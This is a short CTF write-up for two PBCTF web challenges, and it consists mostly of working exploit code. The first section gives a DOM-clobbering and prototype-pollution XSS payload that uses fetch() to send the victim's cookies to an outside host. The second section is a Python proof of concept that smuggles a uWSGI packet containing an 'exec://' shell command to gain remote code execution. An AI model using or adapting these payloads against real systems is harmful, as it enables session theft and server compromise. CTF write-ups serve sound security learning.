PBCTF 
 
 
## Ikea Name Gen 
CONFIG.url is used to fetch a json object and merged using lodash merge which is vulnerable to prototype pollution. We can clobber CONFIG.url and return arbitrary JSON object which leads to XSS.

```html
<a id="CONFIG" name="name">
  <a id="CONFIG" href='http://ikea-name-generator.chal.perfect.blue/404.php?msg={"__proto__":{"innerHTML":"\
           <iframe srcdoc=\"<script src=%2526quot;https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js%2526quot;></script>\
                       <div ng-app>  <img src=x ng-on-error=%2526quot;$event.srcElement.ownerDocument.defaultView.fetch(%26%2339;//ctf.s1r1us.ninja?data=%26%2339;%252b$event.srcElement.ownerDocument.cookie)%2526quot; /> \
                       </div>\"></iframe>"}}' name="url" >
  </a><script>
  ```
  
## Simple Note

I spent most of the time on this challenge, couldn't solve during the CTF.



Repro this bug https://bugs.chromium.org/p/project-zero/issues/detail?id=2050


```python

from ptrlib import *
import sys



def pack_uwsgi(var):
    pk =b""
    for k,v in var.items():
        pk += p16(len(k)) + k + p16(len(v)) + v
    fin = b'\x00' + p16(len(pk)) + b'\x00' + pk
    return fin


vars = {
        b'SERVER_PROTOCOL': b'HTTP/1.1',
        b'REQUEST_METHOD': b'GET',
        b'PATH_INFO': b"/",
        b'REQUEST_URI': b"",
        b'QUERY_STRING': b"",
        b'SERVER_NAME': b"",
        b'HTTP_HOST': b"localhost",
        b'UWSGI_FILE': b"exec://echo 1234>/tmp/s1r1us",
        b'SCRIPT_NAME': b"testapp"
    }
RCE = b'\x00'*100+pack_uwsgi(vars)
RCE = RCE.ljust(8000,b'\x00')
#471 extra sub env var
for brute in range(3876,3877):
    sock = Socket('localhost', 18888)
    payload  = b"GET / HTTP/1.0\r\n"
    payload += b"Host: localhost:18888\r\n"
    payload += "Content-Length: {}\r\n".format(len(RCE)).encode()

    for i in range(13): # 57323 0xdfeb
        payload += "{}DUMMYHEAD:{}\r\n".format(chr(0x41+i), str(i)*3800).encode()

    

    payload += "XDUMMYHEAD:{}\r\n".format('X'*brute).encode()


    payload += b"\r\n"+RCE
    print(len(payload)+471)
    sock.send(payload + b"\r\n")

    sock.close()
```  
